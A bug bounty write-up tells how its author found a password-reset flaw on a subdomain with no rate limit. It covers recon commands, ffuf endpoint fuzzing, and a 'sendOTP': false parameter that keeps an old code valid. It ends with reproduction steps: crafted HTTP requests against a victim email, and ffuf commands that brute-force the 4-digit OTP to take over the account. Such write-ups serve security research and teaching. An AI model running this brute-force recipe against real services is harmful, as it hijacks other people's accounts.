Here is a story of an interesting bug I found on one of my target. Though it was a duplicate, it was a very nice finding. After hunting for few days in the main application of the target, I found nothing but few duplicates. Then I decided to go for it's subdomains. Here are some commands I used:

- Basic enumeration using [subfinder](https://github.com/projectdiscovery/subfinder):
 subfinder -d target[.]com -o all-domains.txt

- Basic enumeration using [assetfinder](https://github.com/tomnomnom/assetfinder):
 echo "target[.]com" | assetfinder | tee -a all-domains.txt

- Active scan using [amass](https://github.com/owasp-amass/amass):
 amass enum -d target[.]com | tee -a amass.txt

- Using permutations with [dnsgen](https://github.com/AlephNullSK/dnsgen) and resolving them with [massdns](https://github.com/blechschmidt/massdns):
 ```
echo "target[.]com" | dnsgen - | massdns -r ~/wordlist/massdns/resolvers.txt -t A -o J --flush 2>/dev/null | cut -d "\"" -f 4 | sed "s/.$//g" | tee -a resolved.txt 
``` 

- After getting the list of domains, I used httpx to filter alive hosts with some port scanning as well:

```
cat all-domains.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443,9200,5601 -sc -cl -title -t 100 -fr -nc | tee -a hosts.txt
```

Then after going through most of the domains, I found a sub-domain "accounts[.]target[.]com" which was a 404 page. Usually, I don't go for 404 pages, but something was interesting in this case. I tried searching this sub-domain in web-archive and all but nothing came up. Then, the only thing I could do there, was to fuzz for endoints. I used ffuf (my fav tool by the way), to fuzz for endpoints. Here is the command:
- using ffuf:
 ```
ffuf -u "https[:]//accounts[.]target[.]com/FUZZ" -w ~/wordlist/custom/all.txt -ac
```

Ffuf came up with some results, nothing interesting except the endpoint "login" which redirected me to a login page. After some enumeration, I found out that the login panel uses the same credentials as the main application "target[.]com", so I was able to login with my own account. After logging in into the application it redirected me to the main domain "target[.]com" which was kinda weird. I was thinking "what is the use of this damn sub-domain then". Then, I started to test the login page as it was different from main application. Unfortunetly, it wasn't vulnerable to anything I initially thought of... but there was no rate limit in place. So, bruteforce attack was possible which was out of scope, ofcourse. Then, I thought "Ok, there is no rate limit. So, maybe there are other features like forgot password/reset password which can be devastating", the reason I thought this was because the main application had a forgot password feature that uses OTP to change the password. But there was no such feature. Then, ffuf comes in play. The command I used:
- using ffuf to fuzz the "login" endpoint:
 ```
ffuf -u "https[:]//accounts[.]target[.]com/login/FUZZ" -w ~/wordlist/custom/all.txt -ac
```

And quickly ffuf found some result, and one of them were "resetPassword [Status: 405, Size: 112, Words: 9, Lines: 1, Duration: 537ms]". I was like f* yeah!! I knew it. Then I quickly crafted the "POST request" to "/resetPassword/verify-email" endpoint with a json body containing "email" and "otp" parameters which was exactly similar to the main application's email verification endpoint. But it returned "404 Not found" error. Then, I realized "Oh, because I have not initiated the forgot password request for this email. If they haven't send me an OTP, how the heck will the application finds it. Huh, so stupid.". I went to the main application and initiated the forgot password request which was a "POST request" to "/forgotPassword" endpoint with a json body containing the "email" parameter, the OTP was sent to my email. Then, I used the crafted "POST request" to "/resetPassword/verify-email" enpoint again with the correct OTP. And it successfully returned "302 Found" letting me change my password. And instantly I thought of "account takeover via OTP bypass due to no rate limit in place". I was screaming like "I am GOD. Noone is better than me. Who the f* is elliot". Annnnd then, I repeated the entire process to verify if the exploit works successfully for the POC, ofcourse. But I found out that after consecutive 5 wrong OTP, the applcation returns "404 Not Found" with a json body containing a parameter "reason" saying "attempts exceeded" or something. So, this was another dead-end. But as you know, a hacker never give up. I enumerated further, and imagined "If I have 5 chances to get the OTP right, let's see if I can initiate the forgot password request again -> get 5 more chances -> and if the old OTP works by any chance" but nope. Unfortunately using the old OTP, the application returned "404 Not Found" with a json body with the same parameter "reason" saying "code mismatched". Another dead-end. I thought "even if it was possible, I wouldn't have been able to initiate the forgot password request from main application every second or as many times I want, as there was rate limit in place in the main app..., and I would probably get blocked, right ?. And the main application also only let's you send maximum 10 OTP to your email. So, that will be merely 50 chances lol and the OTP code is 4 digit long and that will be 10000 combinations". So, is this the end ? Nope, not giving up. I thought "Why haven't I tried to create a similar forgot password 'POST request' to '/forgotPassword' endpoint in 'accounts[.]target[.]com' sub-domain ?". The next thing I tried, was to create a similar "POST request" as the main application to "/forgotPassword" endpoint to see if I can initiate the OTP request more than 10 times. And guess what, I was able to do that, this means that I can initiate as many OTP emails as I want (can cause email DOS, making the servers busy). Then the only problem I had, was that I cannot try more than 5 OTP. After 5 unsuccessful attempts, I have to initiate a new OTP request and this way the old OTP expires. I cannot think shit anymore. And what I did next was nuts. Because "accounts[.]target[.]com" has no rate limit in place, I fuzzed all the way up. I used "paraminer" in burpsuite by albinowax to fuzz everything, literally everything. Then, I found 2 json parameters in the forgot password request (OTP initiate request), HAHAHAHAHA (evil laugh), they were {"email":test@test[.]com, "sendLink": true, "sendOTP": true}. The first parameter "email" was the email you want to send the OTP to. The second parameter "sendLink" was to send a link within the OTP email, if the user wants to change the password via a link (funny thing is, you can change it to false, so that user cannot change the password before you do lol). And the third parameter "sendOTP" was to send the OTP code in the email. When I changed the parameter value of "sendOTP" from `true` to `false`, then guess what happened ? Yepp, the code wasn't send in the email but the request was initiated. Hence, making the previously requested OTP valid. Then, I send a "POST request"  to "/email-verify" endpoint with the previously initiated OTP, and it let me change the password. There we go. Now, using this vulnerability, I was able to completely change anyone's password and takeover their account.

#### Steps to Reproduce: (using ffuf)
1. Navigate to "https[:]//accounts[.]target[.]com/login/" (you can perform user enumeration here)
2. Initiate a forgot password request using the victim email from the main application or using this request:
```
POST /forgotPassword HTTP/1.1
Host: target[.]com
<-snip->
{
"email": "victim@victim[.]com"
}
```

3. This POST request is responsible for initiating OTP request without sending OTP code. Save this request in a file (ex: req1):
```
POST /forgotPassword HTTP/1.1
Host: accounts[.]target[.]com
Random-Host: FUZZ
<-snip->
{
"email": "victim@victim[.]com",
"sendLink": false,
"sendOTP": false
}
```

4. This POST request is used for brute forcing the OTP value. Save this request in another file (ex: req2):
```
POST /resetPassword/verify-email HTTP/1.1
Host: accounts[.]target[.]com
<-snip->
{
"email": "victim@victim[.]com",
"otp": FUZZ
}
```

5. Create otp payloads using this command: `seq -f "%04g" 0 10000 > otp`
6. Open two tabs in terminal.
7. 1st tab: `ffuf -request req1 -w otp -ac -t 1 --timeout 50`
8. 2nd tab: `ffuf -request req2 -w otp -ac`
9. After successfully getting the correct OTP, you can change the password and takeover the account.
